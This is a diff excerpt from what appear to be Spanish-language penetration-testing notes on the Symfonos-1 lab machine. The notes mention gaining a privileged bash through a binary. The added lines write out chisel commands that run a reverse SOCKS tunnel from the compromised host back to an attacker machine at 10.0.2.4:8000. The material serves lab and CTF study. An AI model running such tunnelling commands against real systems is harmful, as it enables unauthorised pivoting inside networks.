@@ -514,7 +514,11 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 	*Maquina Attack*
 	./chisel server --reverse -p 8000	
 
-	*Servidor Python: el servidor debe estar a la escucha en el mismo puerto donde se *
+	*Symfonos-1*
+	./chisel client 10.0.2.4:8000 R:socks
+
+
+	*Servidor Python: el servidor debe estar a la escucha en el mismo puerto donde se hace la conexion con socat*
 	
 
 	*Maquina Symfonos-1*
